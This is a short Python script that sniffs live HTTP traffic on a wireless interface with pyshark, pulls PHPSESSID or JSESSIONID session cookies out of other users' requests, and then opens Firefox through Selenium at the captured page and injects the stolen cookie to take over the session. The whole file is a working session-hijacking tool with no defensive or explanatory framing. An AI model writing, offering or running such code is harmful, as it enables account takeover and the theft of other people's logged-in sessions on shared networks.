import pyshark
from selenium import webdriver

cookie = {"name": "", "value": ""}


def create_cookie(cookies):
    for c in cookies.split(";"):
        cookie_list = c.strip().split("=")
        if cookie_list[0] == "PHPSESSID" or cookie_list[0] == "JSESSIONID":
            cookie["name"], cookie["value"] = cookie_list[0], cookie_list[1]


def catch():
    capture = pyshark.LiveCapture(interface="wlo1", display_filter="http.cookie || http.cookie_pair")

    for packet in capture.sniff_continuously():
        try:
            create_cookie(packet.http.cookie)
            browser = webdriver.Firefox()
            browser.get(packet.http.referer)
            browser.add_cookie(cookie)
            browser.refresh()
            break
        except Exception:
            continue


if __name__ == "__main__":
    catch()
